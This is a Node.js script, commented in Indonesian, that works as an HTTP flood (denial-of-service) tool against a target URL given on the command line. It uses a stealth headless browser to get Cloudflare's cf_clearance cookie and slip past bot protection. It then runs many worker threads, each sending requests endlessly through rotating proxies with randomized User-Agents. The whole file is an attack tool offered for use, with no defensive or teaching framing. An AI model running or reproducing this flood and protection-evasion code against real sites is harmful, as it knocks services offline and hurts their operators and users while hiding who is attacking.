const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');

// ======================== KONFIGURASI ========================
const [targetUrl, maxConcurrentRequests] = process.argv.slice(2);
if (!targetUrl || isNaN(maxConcurrentRequests)) {
    console.log("Usage: node script.js <target_url> <max_concurrent_requests>");
    process.exit(1);
}

const MAX_CONCURRENT = parseInt(maxConcurrentRequests, 10);
const TARGET_URL = targetUrl;
const REQUEST_DELAY_MS = 1000; // jeda antar request per worker (ms)

// Baca proxy dari file proxy.txt
let PROXY_LIST = [];
try {
    PROXY_LIST = fs.readFileSync('proxy.txt', 'utf-8')
        .split('\n')
        .map(p => p.trim())
        .filter(p => p && !p.startsWith('#'));
    if (PROXY_LIST.length === 0) {
        console.error("[-] proxy.txt kosong atau tidak valid.");
        process.exit(1);
    }
    console.log(`[+] Loaded ${PROXY_LIST.length} proxies.`);
} catch (err) {
    console.error(`[-] Gagal membaca proxy.txt: ${err.message}`);
    process.exit(1);
}

// ======================== FUNGSI BYPASS CAPTCHA (Cloudflare) ========================
puppeteer.use(StealthPlugin());

async function bypassCaptcha(retries = 3) {
    for (let attempt = 1; attempt <= retries; attempt++) {
        const browser = await puppeteer.launch({ headless: 'new' });
        const page = await browser.newPage();
        
        // User-Agent random
        const ua = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 50 + 70)}.0.0.0 Safari/537.36`;
        await page.setUserAgent(ua);
        
        try {
            console.log(`[CF] Attempt ${attempt} - Membuka ${TARGET_URL}`);
            await page.goto(TARGET_URL, { waitUntil: 'networkidle2', timeout: 30000 });
            
            // Tunggu kemungkinan halaman challenge Cloudflare
            const cfChallenge = await page.waitForSelector('#challenge-form, .challenge-container, iframe[title*="captcha"]', { timeout: 10000 }).catch(() => null);
            if (cfChallenge) {
                console.log(`[CF] Challenge terdeteksi, mencoba menyelesaikan...`);
                // Simulasi penyelesaian manual (Anda perlu mengganti dengan solver nyata seperti 2captcha)
                // Di sini kita hanya menunggu beberapa detik dengan asumsi challenge selesai otomatis
                await page.waitForTimeout(15000);
            }
            
            // Tunggu hingga cf_clearance tersedia
            await page.waitForFunction(() => {
                return document.cookie.includes('cf_clearance=');
            }, { timeout: 30000 });
            
            const cookies = await page.cookies();
            const cfClearance = cookies.find(c => c.name === 'cf_clearance')?.value;
            if (!cfClearance) throw new Error('cf_clearance tidak ditemukan');
            
            console.log(`[CF] Berhasil mendapatkan cf_clearance: ${cfClearance.substring(0, 20)}...`);
            await browser.close();
            return cfClearance;
        } catch (error) {
            console.error(`[CF] Attempt ${attempt} gagal: ${error.message}`);
            await browser.close();
            if (attempt === retries) throw new Error('Gagal bypass CAPTCHA setelah beberapa percobaan');
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

// ======================== WORKER THREAD (request loop) ========================
if (isMainThread) {
    // Main thread: membuat worker pool
    (async () => {
        let cfClearance;
        try {
            cfClearance = await bypassCaptcha(3);
            console.log(`[+] cf_clearance siap digunakan.`);
        } catch (err) {
            console.error(`[-] ${err.message}`);
            process.exit(1);
        }
        
        const workers = [];
        let activeWorkers = 0;
        
        // Fungsi untuk membuat worker baru
        const createWorker = (proxy) => {
            const worker = new Worker(__filename, {
                workerData: {
                    cfClearance: cfClearance,
                    proxy: proxy,
                    targetUrl: TARGET_URL,
                    delayMs: REQUEST_DELAY_MS
                }
            });
            
            worker.on('message', (msg) => {
                console.log(`[Worker ${worker.threadId}] ${msg}`);
            });
            
            worker.on('error', (err) => {
                console.error(`[Worker ${worker.threadId}] Error: ${err.message}`);
            });
            
            worker.on('exit', (code) => {
                if (code !== 0) {
                    console.error(`[Worker ${worker.threadId}] Keluar dengan kode ${code}`);
                }
                activeWorkers--;
                // Jika worker mati, buat pengganti (optional)
                // createWorker(PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)]);
            });
            
            activeWorkers++;
            return worker;
        };
        
        // Jalankan sejumlah worker sesuai max concurrent
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            const randomProxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
            const worker = createWorker(randomProxy);
            workers.push(worker);
            // Jeda kecil agar tidak overload saat startup
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        console.log(`[+] ${workers.length} worker berjalan. Tekan Ctrl+C untuk berhenti.`);
        
        // Handle graceful shutdown
        process.on('SIGINT', () => {
            console.log('\n[!] Menerima SIGINT, menghentikan semua worker...');
            for (const worker of workers) {
                worker.terminate();
            }
            process.exit(0);
        });
    })();
    
} else {
    // Worker thread: melakukan request berulang menggunakan proxy dan cf_clearance
    const { cfClearance, proxy, targetUrl, delayMs } = workerData;
    
    // Buat agent proxy
    let agent;
    try {
        agent = new HttpsProxyAgent(proxy);
    } catch (err) {
        parentPort.postMessage(`Gagal membuat proxy agent: ${err.message}`);
        process.exit(1);
    }
    
    // Loop tak terbatas
    (async () => {
        while (true) {
            // User-Agent random
            const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 50 + 70)}.0.0.0 Safari/537.36`;
            
            const headers = {
                'User-Agent': userAgent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': `cf_clearance=${cfClearance}`
            };
            
            try {
                const response = await axios.get(targetUrl, {
                    headers,
                    httpsAgent: agent,
                    timeout: 10000,
                    validateStatus: () => true // terima semua status
                });
                parentPort.postMessage(`Request sukses | Status: ${response.status} | Proxy: ${proxy.split('@').pop() || proxy}`);
            } catch (error) {
                parentPort.postMessage(`Request gagal | Error: ${error.message} | Proxy: ${proxy.split('@').pop() || proxy}`);
            }
            
            // Jeda sebelum request berikutnya
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
    })();
              }
